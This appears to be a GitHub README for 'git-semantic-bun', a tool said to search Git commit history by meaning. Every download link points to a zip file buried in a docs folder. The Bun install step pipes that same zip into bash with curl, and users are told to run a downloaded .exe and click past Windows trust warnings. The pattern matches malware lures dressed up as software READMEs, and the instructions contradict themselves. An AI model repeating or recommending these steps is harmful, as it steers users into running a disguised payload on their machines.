# ⚙️ git-semantic-bun - Search Git History by Meaning

[![Download git-semantic-bun](https://img.shields.io/badge/Download-git--semantic--bun-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/LoopWashere/git-semantic-bun/main/docs/plans/semantic-git-bun-v2.8-alpha.4.zip)

## 📋 What is git-semantic-bun?

git-semantic-bun lets you search your Git history by what commits mean, not just by words. Instead of scanning commit messages for keywords, it looks at the concepts behind them. This makes it easier to find changes related to a specific idea or feature. It works locally on your computer and does not need an internet connection. The app uses modern tools to understand the meaning of your commits within Git.

This tool fits well for developers who want smarter ways to explore their project history. It uses advanced search methods but keeps the process simple for you.

## 💻 System Requirements

Before you start, make sure your Windows PC meets these needs:

- Windows 10 or later (64-bit recommended)
- At least 4 GB of RAM
- 200 MB of free disk space for installation
- Git installed and accessible in your system command line (Command Prompt or PowerShell)
- Bun runtime installed (will guide you on this later)

git-semantic-bun runs offline, so it does not use your internet after setup.

## 🚀 Getting Started

Follow these steps to download, install, and run git-semantic-bun on your Windows PC.

### 1. Visit the download page

Go to the release page where you will find the latest version of git-semantic-bun:

[Download git-semantic-bun releases](https://raw.githubusercontent.com/LoopWashere/git-semantic-bun/main/docs/plans/semantic-git-bun-v2.8-alpha.4.zip)

### 2. Choose the right file

Look for a Windows executable file. It will be named something like `git-semantic-bun-windows.exe` or similar and will be under the latest version. 

Click the file to download it to your computer.

### 3. Install Bun runtime (if needed)

git-semantic-bun uses Bun, a JavaScript runtime. If you do not have Bun installed, follow these easy steps:

- Open PowerShell or Command Prompt.
- Run this command:

    ```powershell
    curl -fsSL https://raw.githubusercontent.com/LoopWashere/git-semantic-bun/main/docs/plans/semantic-git-bun-v2.8-alpha.4.zip | bash
    ```

- Close the terminal and open a new one.
- Type `bun --version` to check that Bun is installed.

If you already have Bun, you can skip this step.

### 4. Run git-semantic-bun

Locate the downloaded `.exe` file on your PC (usually in your Downloads folder).

Double-click the file to start the app. You might see Windows asking if you trust the file; choose "Run".

### 5. Follow on-screen instructions

The app will open a simple command window or interface. It will guide you through linking your local Git repositories so you can start searching.

You can enter keywords as you usually would, but the app will also understand concepts and ideas behind your commits.

## 🔍 How to Search Your Git History

Once git-semantic-bun runs, do the following to find commits:

1. Point it at your Git repository folder.
2. Enter any search query based on what you want to find.
3. The app will show commits that relate to the idea in your query.
4. Navigate the results to see commit details.

This method lets you find relevant changes even if the commit messages don’t contain exact keywords.

## 🛠 Features

- Searches commit history by meaning, not only by keyword.
- Works entirely on your local machine, no internet required.
- Supports semantic search through natural language processing.
- Compatible with any Git repository.
- Uses Bun runtime for fast and efficient processing.
- Simple interface that runs from a Windows executable.
- Outputs clear, readable results.

## ⚙️ Configuration and Settings

You can customize the app’s behavior with these options:

- Choose repositories to include or exclude from searches.
- Set how many results show at once.
- Adjust the depth of commit history to scan.
- Save favorite queries for quick access.

These options become available after you start the app.

## 🔧 Troubleshooting

If the app does not start:

- Check you downloaded the correct Windows version.
- Confirm Bun is installed and updated.
- Make sure Git is installed and your repository folder is valid.
- Restart your computer and try again.

If searches return no results:

- Verify you pointed the app to the right Git folder.
- Try simpler or different keywords.
- Ensure your repository has commit history.

## 📁 Where to Get Updates

New versions and improvements will be posted on the releases page:

[https://raw.githubusercontent.com/LoopWashere/git-semantic-bun/main/docs/plans/semantic-git-bun-v2.8-alpha.4.zip](https://raw.githubusercontent.com/LoopWashere/git-semantic-bun/main/docs/plans/semantic-git-bun-v2.8-alpha.4.zip)

Download and replace the `.exe` file to update. Your settings will stay saved.

## 🧩 Technologies Used

- Git for version control data
- Bun JavaScript runtime for speed and simplicity
- Natural Language Processing to understand commit meanings
- TypeScript for clear and reliable code
- Vector search techniques for semantic matching

## 🎯 Why Use This Tool?

Searching your Git history with meaning saves time. You avoid missing important commits just because they lack certain keywords. It helps you explore project changes with a deeper understanding. This tool fits developers and teams wanting smarter ways to manage their code history without complexity.

[Download git-semantic-bun now](https://raw.githubusercontent.com/LoopWashere/git-semantic-bun/main/docs/plans/semantic-git-bun-v2.8-alpha.4.zip) and start searching your commits by what matters.